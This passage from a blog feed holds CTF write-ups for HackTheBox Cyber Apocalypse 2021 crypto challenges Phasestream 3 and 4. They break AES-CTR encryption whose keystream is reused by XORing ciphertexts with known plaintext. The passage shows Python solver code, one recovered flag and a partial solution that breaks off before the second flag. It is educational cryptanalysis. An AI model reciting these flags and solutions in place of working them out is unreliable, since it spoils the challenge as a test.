style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">result</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> getAscii</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Result:'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Result:'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xored </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ciphertext2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ciphertext1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">xored</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> plaintext</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And so, we get our flag</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Result: 0d27743012155b01155c027f1b41302955203114002413</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Result: CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">r3u53d_k3Y_4TT4cK</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Phasestream 4 - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/phasestream-4-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/phasestream-4-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the challenge Phasestream 4, part of the Hack the box's Cyberapocalypse CTF 2021, category Crypto.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the challenge Phasestream 4, part of the Hack the box's Cyberapocalypse CTF 2021, category Crypto.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/phasestream-4-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>The aliens saw us break PhaseStream 3 and have proposed a quick fix to protect their new cipher.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/phasestream-4-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>What we see here, is a direct continuation of the Phasestream 3 challenge. You should probably check out my write-up of that one, if you don't know the concept of repating keystream attacks.</p>
<p><a href="https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf">Phasestream 3 - Cyberapocalypse 2021 CTF</a></p>
<p>The only main difference from this last challenge, is that we no longer have the <code>test</code> plaintext string readily available to us. But we still have its encrypted value in our <code>output.txt</code></p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> output.txt 2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955 2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The code of the encryptor itself hasn't changed other than not showing the test text.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> Crypto</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Cipher </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> AES</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> Crypto</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Util </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> Counter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">KEY </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">urandom</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">plaintext</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cipher </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> AES</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">new</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">KEY</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> AES</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">MODE_CTR</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> counter</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Counter</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">new</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ciphertext </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cipher</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">plaintext</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> ciphertext</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'test_quote.txt'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'rb'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    test_quote </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">test_quote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'flag.txt'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'rb'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>But we do get the information, that the test string is a <strong>quote</strong>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analysis">Analysis<a href="https://kblagoev.com/blog/phasestream-4-cyberapocalypse-2021-ctf#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis">​</a></h3>
<p>Well, our first steps of finding the solution are pretty much the same as in Phasestream 3:</p>
<ol>
<li>We XOR the two ciphertexts from output.txt together</li>
<li>Since we know that our flag starts with <code>CHTB{</code>, we will XOR the result of <code>1.</code> with it, to see the first letters of our quote.</li>
</ol>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ciphertext1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'2d0fb3a56aa66e1e44cffc97f3a2e030feab144124e73c76d5d22f6ce01c46e73a50b0edc1a2bd243f9578b745438b00720870e3118194cbb438149e3cc9c0844d640ecdb1e71754c24bf43bf3fd0f9719f74c7179b6816e687fa576abad1955'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ciphertext2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'2767868b7ebb7f4c42cfffa6ffbfb03bf3b8097936ae3c76ef803d76e11546947157bcea9599f826338807b55655a05666446df20c8e9387b004129e10d18e9f526f71cabcf21b48965ae36fcfee1e820cf1076f65'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flagStart </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b'CHTB{'</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> hex2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> getAscii </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> ind </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    longIndex </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ind</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shortIndex </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ind</span><span class="token operator" style="color:#393A34">%</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hex2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hexChar1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> hex1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">longIndex</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">longIndex</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hexChar1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hexChar2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> hex2</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">shortIndex</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">shortIndex</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    byte2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hexChar2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    asciiNum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> byte1 </span><span class="token operator" style="color:#393A34">^</span><span class="token plain"> byte2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    result</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">asciiNum</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">result</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> getAscii</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Result:'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Result:'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> out</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xored </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ciphertext2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ciphertext1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">startQuote </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">xored</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> flagStart</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Result: 0a68352e141d1152060003310c1d500b0d131d38124900003a52121a010900734b070c07543b45020c1d7f0213162b56144c1d111d0f074c043c06002c184e1b1f0b7f070d150c1c541117543c13111515064b1e1c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Result: I alo^YD</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">@yX_+HEG_CQTBAZNCrC</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">EwDoyOU+@hUcV7^YIM</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">LhD</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">oPYdH7SOnOTSltGSnVN</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">g</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So, from our analysis, we can see that the <code>test_quote</code> string starts with "I alo". I think it's easy to assume, that the first two words will be "I alone".</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/phasestream-4-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>This one took a bit of research. We had to find a popular quote, which starts with "I alone". After a couple of tries, I found that to be a quote by <em>Mother Theresa</em>, which reads as follows:</p>
<blockquote>
<p>I alone cannot change the world, but I can cast a stone across the water to create many ripples.</p>
</blockquote>
<p>So, we can take our XOR result from step 1 of the analysis, and XOR it with this quote.</p>
<p>This gives us the flag to be as follows</p>
